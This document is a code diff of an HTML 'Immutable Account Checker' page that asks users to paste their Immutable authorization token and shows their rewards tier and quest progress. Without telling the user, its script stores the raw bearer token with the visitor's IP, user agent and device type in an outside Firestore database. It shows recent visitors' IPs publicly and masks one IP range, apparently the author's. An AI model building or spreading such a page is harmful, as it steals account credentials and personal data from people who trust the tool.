@@ -2,183 +2,197 @@
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8">
-  <title>Immutable API Checker</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 40px;
-      background-color: #f4f4f4;
-    }
+    <meta charset="UTF-8">
+    <title>Immutable API Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background-color: #f4f4f4;
+        }
 
-    textarea,
-    pre {
-      width: 100%;
-      font-size: 14px;
-      margin-top: 10px;
-    }
+        textarea,
+        pre {
+            width: 100%;
+            font-size: 14px;
+            margin-top: 10px;
+        }
 
-    button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-    }
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
 
-    .history-entry {
-      border: 1px solid #ccc;
-      background: #fff;
-      padding: 10px;
-      margin-top: 10px;
-    }
+        .history-entry {
+            border: 1px solid #ccc;
+            background: #fff;
+            padding: 10px;
+            margin-top: 10px;
+        }
 
-    ul {
-      margin: 5px 0;
-      padding-left: 20px;
-    }
+        ul {
+            margin: 5px 0;
+            padding-left: 20px;
+        }
 
-    .tier-common {
-      color: #666;
-      font-size: 20px;
-      font-weight: bold;
-    }
+        .tier-common {
+            color: #666;
+            font-size: 20px;
+            font-weight: bold;
+        }
 
-    .tier-uncommon {
-      color: green;
-      font-size: 22px;
-      font-weight: bold;
-    }
+        .tier-uncommon {
+            color: green;
+            font-size: 22px;
+            font-weight: bold;
+        }
 
-    .tier-rare {
-      color: blue;
-      font-size: 22px;
-      font-weight: bold;
-      font-style: italic;
-    }
+        .tier-rare {
+            color: blue;
+            font-size: 22px;
+            font-weight: bold;
+            font-style: italic;
+        }
 
-    .tier-epic {
-      color: purple;
-      font-size: 22px;
-      font-weight: bold;
-      text-decoration: underline;
-    }
+        .tier-epic {
+            color: purple;
+            font-size: 22px;
+            font-weight: bold;
+            text-decoration: underline;
+        }
 
-    .tier-legend {
-      color: goldenrod;
-      font-size: 24px;
-      font-weight: bold;
-      text-shadow: 1px 1px 2px #000;
-    }
+        .tier-legend {
+            color: goldenrod;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px #000;
+        }
 
-    #response {
-      font-weight: 500;
-      font-size: 2rem;
-      color: red;
-      margin-top: 20px;
-    }
+        #response {
+            font-weight: 500;
+            font-size: 2rem;
+            color: red;
+            margin-top: 20px;
+        }
 
-    #response .green {
-      color: green;
-      font-size: 2rem;
-      font-weight: 500;
-    }
-  </style>
+        #response .green {
+            color: green;
+            font-size: 2rem;
+            font-weight: 500;
+        }
+
+        #loader {
+            margin-top: 20px;
+            text-align: center;
+        }
+    </style>
 </head>
 
 <body>
-  <h2>Immutable Account Checker</h2>
-  <label for="auth">Enter Authorization Token:</label>
-  <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
-  <button id="sendBtn">Check</button>
-  <div id="response"></div>
-  <div id="alreadyLogged"></div>
-  <div id="history"></div>
+    <h2>Immutable Account Checker</h2>
+    <label for="auth">Enter Authorization Token:</label>
+    <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
+    <button id="sendBtn">Check</button>
+    <div id="loader" style="display:none;">
+        <svg width="50" height="50" viewBox="0 0 50 50">
+            <circle cx="25" cy="25" r="20" stroke="gray" stroke-width="5" fill="none" stroke-linecap="round">
+                <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s"
+                    repeatCount="indefinite" />
+            </circle>
+        </svg>
+    </div>
+
+    <div id="response"></div>
+    <div id="alreadyLogged"></div>
+    <div id="history"></div>
 
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
-    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
-    import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs, where } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
+        import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs, where } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
-      authDomain: "immutable-api.firebaseapp.com",
-      projectId: "immutable-api",
-      storageBucket: "immutable-api.appspot.com",
-      messagingSenderId: "839008159453",
-      appId: "1:839008159453:web:926ea99baca831b6afbd34",
-      measurementId: "G-S61XTYNME9"
-    };
+        const firebaseConfig = {
+            apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
+            authDomain: "immutable-api.firebaseapp.com",
+            projectId: "immutable-api",
+            storageBucket: "immutable-api.firebasestorage.app",
+            messagingSenderId: "839008159453",
+            appId: "1:839008159453:web:f57d46599dadd29dafbd34",
+            measurementId: "G-EH5P3LS1B6"
+        };
 
-    const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
-    const db = getFirestore(app);
-
-
-    async function generateLogId(token, progress, tier) {
-      const raw = `${token}|${progress}|${tier}`;
-      const encoder = new TextEncoder();
-      const data = encoder.encode(raw);
-      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-      const hashArray = Array.from(new Uint8Array(hashBuffer));
-      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-    }
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getFirestore(app);
 
 
-    async function getUserIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        let ip = data.ip;
-        if (ip.startsWith("175.176")) ip = "192.168.1.1";
-        return ip;
-      } catch {
-        return "Unknown IP";
-      }
-    }
+        async function generateLogId(token, progress, tier) {
+            const raw = `${token}|${progress}|${tier}`;
+            const encoder = new TextEncoder();
+            const data = encoder.encode(raw);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
 
-    function getDeviceType() {
-      const ua = navigator.userAgent;
-      if (/Mobi|Android/i.test(ua)) return "Mobile";
-      if (/iPad|Tablet/i.test(ua)) return "Tablet";
-      return "Desktop";
-    }
 
-    function getTierClass(tier) {
-      switch (tier.toLowerCase()) {
-        case 'common': return 'tier-common';
-        case 'uncommon': return 'tier-uncommon';
-        case 'rare': return 'tier-rare';
-        case 'epic': return 'tier-epic';
-        case 'legend': return 'tier-legend';
-        default: return '';
-      }
-    }
+        async function getUserIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                let ip = data.ip;
+                if (ip.startsWith("175.176")) ip = "192.168.1.1";
+                return ip;
+            } catch {
+                return "Unknown IP";
+            }
+        }
 
-    async function renderHistory() {
-      const historyBox = document.getElementById('history');
-      historyBox.innerHTML = "";
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/Mobi|Android/i.test(ua)) return "Mobile";
+            if (/iPad|Tablet/i.test(ua)) return "Tablet";
+            return "Desktop";
+        }
 
-      const q = query(collection(db, "userStatsHistory"), orderBy("timestamp", "desc"), limit(5));
-      const querySnapshot = await getDocs(q);
+        function getTierClass(tier) {
+            switch (tier.toLowerCase()) {
+                case 'common': return 'tier-common';
+                case 'uncommon': return 'tier-uncommon';
+                case 'rare': return 'tier-rare';
+                case 'epic': return 'tier-epic';
+                case 'legend': return 'tier-legend';
+                default: return '';
+            }
+        }
 
-      querySnapshot.forEach(doc => {
-        const entry = doc.data();
-        const time = entry.timestamp?.toDate
-          ? entry.timestamp.toDate().toLocaleString()
-          : new Date(entry.timestamp).toLocaleString();
+        async function renderHistory() {
+            const historyBox = document.getElementById('history');
+            historyBox.innerHTML = "";
 
-        const stats = entry.stats.userStats || {};
-        const rules = entry.stats.eligibility?.rules || {};
-        const tier = stats.bucketName || 'N/A';
-        const tierClass = getTierClass(tier);
-        const quests = stats.targetQuestsCompleted || [];
-        const questList = quests.length
-          ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
-          : '<em>No quests completed</em>';
+            const q = query(collection(db, "userStatsHistory"), orderBy("timestamp", "desc"), limit(5));
+            const querySnapshot = await getDocs(q);
 
-        const div = document.createElement("div");
-        div.className = "history-entry";
-        div.innerHTML = `
+            querySnapshot.forEach(doc => {
+                const entry = doc.data();
+                const time = entry.timestamp?.toDate
+                    ? entry.timestamp.toDate().toLocaleString()
+                    : new Date(entry.timestamp).toLocaleString();
+
+                const stats = entry.stats.userStats || {};
+                const rules = entry.stats.eligibility?.rules || {};
+                const tier = stats.bucketName || 'N/A';
+                const tierClass = getTierClass(tier);
+                const quests = stats.targetQuestsCompleted || [];
+                const questList = quests.length
+                    ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
+                    : '<em>No quests completed</em>';
+
+                const div = document.createElement("div");
+                div.className = "history-entry";
+                div.innerHTML = `
           <strong>🕒 ${time}</strong><br>
           <strong>🌐 IP:</strong> ${entry.ip}<br>
           <strong>🧭 User Agent:</strong> ${entry.userAgent || 'Unknown'}<br>
@@ -194,111 +208,116 @@
           <strong>🔗 Linked Social:</strong> ${rules.have_linked_any_social_media ? '✅ Yes' : '❌ No'}<br>
           <strong>📞 Verified Phone:</strong> ${rules.have_verified_phone ? '✅ Yes' : '❌ No'}<br>
         `;
-        historyBox.appendChild(div);
-      });
-    }
-
-    document.getElementById('sendBtn').addEventListener('click', async () => {
-      const token = document.getElementById('auth').value.trim();
-      const responseBox = document.getElementById('response');
-      const alreadyLog = document.getElementById('alreadyLogged');
-
-      // Clear previous output
-      responseBox.innerHTML = "";
-      alreadyLog.innerHTML = "";
-
-      if (!token) {
-        responseBox.textContent = 'Please enter a valid token.';
-        return;
-      }
-
-      try {
-        const ip = await getUserIP();
-        const userAgent = navigator.userAgent;
-        const deviceType = getDeviceType();
-
-        const headers = {
-          'Authorization': `Bearer ${token}`,
-          'Accept': 'application/json, text/plain, */*',
-          'Access-Control-Allow-Origin': '*',
-          'Origin': 'https://play.immutable.com',
-          'Referer': 'https://play.immutable.com/',
-          'User-Agent': userAgent
-        };
-
-        const [statsRes, eligibilityRes] = await Promise.all([
-          fetch('https://api.immutable.com/v2/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
-          fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
-        ]);
-
-        if (!statsRes.ok || !eligibilityRes.ok) {
-          responseBox.textContent = 'Invalid or Expired Authentication token';
-          return;
+                historyBox.appendChild(div);
+            });
         }
 
-        const statsData = await statsRes.json();
-        const eligibilityData = await eligibilityRes.json();
+        document.getElementById('sendBtn').addEventListener('click', async () => {
+            const token = document.getElementById('auth').value.trim();
+            const responseBox = document.getElementById('response');
+            const alreadyLog = document.getElementById('alreadyLogged');
 
-        const combined = {
-          userStats: statsData.userStats || {},
-          eligibility: eligibilityData || {}
-        };
+            // Clear previous output
+            responseBox.innerHTML = "";
+            alreadyLog.innerHTML = "";
+            loader.style.display = 'block';
 
-        const progress = combined.userStats?.progressPercentage || 0;
-        const tier = combined.userStats?.bucketName || 'N/A';
-        const logId = await generateLogId(token, progress, tier);
+            if (!token) {
+                responseBox.textContent = 'Please enter a valid token.';
+                loader.style.display = 'none';
+                return;
+            }
 
-        const q = query(collection(db, "userStatsHistory"), where("logId", "==", logId), limit(1));
-        const snapshot = await getDocs(q);
-        const alreadyLoggedFlag = !snapshot.empty;
+            try {
+                const ip = await getUserIP();
+                const userAgent = navigator.userAgent;
+                const deviceType = getDeviceType();
 
-        const tierClass = getTierClass(tier);
-        const quests = combined.userStats.targetQuestsCompleted || [];
-        const questList = quests.length
-          ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
-          : '<em>No quests completed</em>';
+                const headers = {
+                    'Authorization': `Bearer ${token}`,
+                    'Accept': 'application/json, text/plain, */*',
+                    'Access-Control-Allow-Origin': '*',
+                    'Origin': 'https://play.immutable.com',
+                    'Referer': 'https://play.immutable.com/',
+                    'User-Agent': userAgent
+                };
 
-        if (alreadyLoggedFlag) {
-          responseBox.textContent = 'There are no new changes';
-          alreadyLog.innerHTML = `
+                const [statsRes, eligibilityRes] = await Promise.all([
+                    fetch('https://api.immutable.com/v2/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
+                    fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
+                ]);
+
+                if (!statsRes.ok || !eligibilityRes.ok) {
+                    responseBox.textContent = 'Invalid or Expired Authentication token';
+                    loader.style.display = 'none';
+                    return;
+                }
+
+                const statsData = await statsRes.json();
+                const eligibilityData = await eligibilityRes.json();
+
+                const combined = {
+                    userStats: statsData.userStats || {},
+                    eligibility: eligibilityData || {}
+                };
+
+                const progress = combined.userStats?.progressPercentage || 0;
+                const tier = combined.userStats?.bucketName || 'N/A';
+                const logId = await generateLogId(token, progress, tier);
+
+                const q = query(collection(db, "userStatsHistory"), where("logId", "==", logId), limit(1));
+                const snapshot = await getDocs(q);
+                const alreadyLoggedFlag = !snapshot.empty;
+
+                const tierClass = getTierClass(tier);
+                const quests = combined.userStats.targetQuestsCompleted || [];
+                const questList = quests.length
+                    ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
+                    : '<em>No quests completed</em>';
+
+                if (alreadyLoggedFlag) {
+                    responseBox.textContent = 'There are no new changes';
+                    loader.style.display = 'none';
+                    alreadyLog.innerHTML = `
         <div class="history-entry">
           <strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
           <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
           <strong>🧩 Quests Completed:</strong> ${questList}<br><br>
         </div>`;
-          await renderHistory();
-          return;
-        }
+                    await renderHistory();
+                    return;
+                }
 
-        await addDoc(collection(db, "userStatsHistory"), {
-          authToken: token,
-          ip,
-          userAgent,
-          deviceType,
-          stats: combined,
-          logId,
-          timestamp: new Date()
-        });
-
-        responseBox.innerHTML = '<div class="green">Request successfully!</div>';
-        alreadyLog.innerHTML = `
+                await addDoc(collection(db, "userStatsHistory"), {
+                    authToken: token,
+                    ip,
+                    userAgent,
+                    deviceType,
+                    stats: combined,
+                    logId,
+                    timestamp: new Date()
+                });
+                loader.style.display = 'none';
+                responseBox.innerHTML = '<div class="green">Request successfully!</div>';
+                alreadyLog.innerHTML = `
       <div class="history-entry">
         <strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
         <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
         <strong>🧩 Quests Completed:</strong> ${questList}<br><br>
       </div>`;
 
-        await renderHistory();
-      } catch (err) {
-        responseBox.textContent = '❌ Unexpected error occurred.';
-        console.error(err);
-      }
-    });
+                await renderHistory();
+            } catch (err) {
+                responseBox.textContent = '❌ Unexpected error occurred.';
+                loader.style.display = 'none';
+                console.error(err);
+            }
+        });
 
 
-    // Show history on page load
-    renderHistory();
-  </script>
+        // Show history on page load
+        renderHistory();
+    </script>
 </body>
 
 
